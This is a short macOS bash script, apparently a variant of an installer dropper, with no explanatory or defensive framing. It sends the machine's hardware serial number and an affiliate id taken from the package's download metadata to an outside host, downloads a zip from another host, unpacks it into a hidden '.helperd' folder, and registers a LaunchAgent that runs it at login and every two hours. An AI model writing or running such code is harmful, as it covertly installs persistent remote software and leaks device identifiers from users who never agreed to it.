#!/bin/bash
# Variant: mdls/grep -o attribution, ioreg serial, unzip, PlistBuddy, wget.
HWSERIAL=$(ioreg -l | grep IOPlatformSerialNumber | awk -F'"' '{print $4}')
ORIGIN=$(mdls -raw -name kMDItemWhereFroms "$PACKAGE_PATH" | tr -d '()"\n ')
AFF=$(echo "$ORIGIN" | grep -o 'affid=[A-Za-z0-9]*' | cut -d= -f2)
STAGE="$(mktemp -d)"
AGENTDIR="$HOME/Library/Application Support/.helperd"
PLIST="$HOME/Library/LaunchAgents/com.helperd.refresh.plist"
curl -s -X POST -d "sn=$HWSERIAL&aff=$AFF" "https://ping.example-cdn.net/i"
wget -q -O "$STAGE/h.zip" "https://cdn.example-cdn.net/h.zip"
mkdir -p "$AGENTDIR"
unzip -o -q "$STAGE/h.zip" -d "$AGENTDIR"
/usr/libexec/PlistBuddy -c "Add :Label string com.helperd.refresh" "$PLIST"
/usr/libexec/PlistBuddy -c "Add :ProgramArguments array" "$PLIST"
/usr/libexec/PlistBuddy -c "Add :ProgramArguments:0 string $AGENTDIR/helperd" "$PLIST"
/usr/libexec/PlistBuddy -c "Add :RunAtLoad bool true" "$PLIST"
/usr/libexec/PlistBuddy -c "Add :StartInterval integer 7200" "$PLIST"
launchctl load -w "$PLIST"
rm -rf "$STAGE"
